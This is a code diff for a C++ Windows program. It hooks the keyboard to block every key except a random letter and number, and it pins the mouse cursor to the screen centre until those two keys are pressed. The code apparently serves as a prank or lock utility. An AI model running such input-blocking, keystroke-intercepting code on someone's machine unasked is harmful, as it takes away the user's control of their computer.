@@ -29,53 +29,42 @@ int WindowY() {
 void BlockMouseMs() {
     while (ExitCount < 2) {
         SetCursorPos(WindowX() / 2, WindowY() / 2); 
+        this_thread::sleep_for(chrono::milliseconds(2));
     }
 }
 
 
 LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0) {
+    if (nCode >= 0 && wParam == WM_KEYDOWN) {
         kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-        BYTE KeyboardState[256] = {};
-        wchar_t UnicodeCharacter[3] = {};
 
-        GetKeyState(VK_SHIFT);
-        GetKeyState(VK_MENU);
+        wchar_t UnicodeCharacter[3] = {};
+        BYTE KeyboardState[256] = {};
         GetKeyboardState(KeyboardState);
 
-        ToUnicodeEx((UINT)kbdStruct.vkCode, (UINT)kbdStruct.scanCode, KeyboardState, UnicodeCharacter, sizeof(UnicodeCharacter) / sizeof(*UnicodeCharacter) - 1, (UINT)kbdStruct.flags, GetKeyboardLayout(0));
-
-        if (wParam == WM_KEYDOWN) {
+        if (ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, KeyboardState, UnicodeCharacter, 2, 0, GetKeyboardLayout(0)) == 1) {
             lastKeyPressed = (char)UnicodeCharacter[0];
             cout << lastKeyPressed << " pressed Down" << endl;
-            if (UnicodeCharacter[0] != RandomNum && UnicodeCharacter[0] != RandomKey)
-            {
-                return -1;
-            }
 
-            if (lastKeyPressed == RandomKey)
-            { 
-                    ExitCount++;
-            }
-            if (lastKeyPressed == RandomNum)
-            {
+            if (lastKeyPressed == RandomKey || lastKeyPressed == RandomNum) {
                 ExitCount++;
-                if (ExitCount == 2)
-                {
-                    
+                if (ExitCount == 2) {
                     PostQuitMessage(0);
                 }
+            } 
+            else {
+                return -1; 
             }
         }
     }
     return CallNextHookEx(_hook, nCode, wParam, lParam);
-
 }
 
 
 int main() {
     srand(static_cast<unsigned int>(time(0)));
     thread mouseThread(BlockMouseMs);
+    mouseThread.detach();
     const string Alphabet[26] = {
         "Alfa", "Bravo", "Charlie", "Delta", "Echo", "Foxtrot", "Golf", "Hotel", "India", "Juliett",
         "Kilo", "Lima", "Mike", "November", "Oscar", "Papa", "Quebec", "Romeo", "Sierra", "Tango",
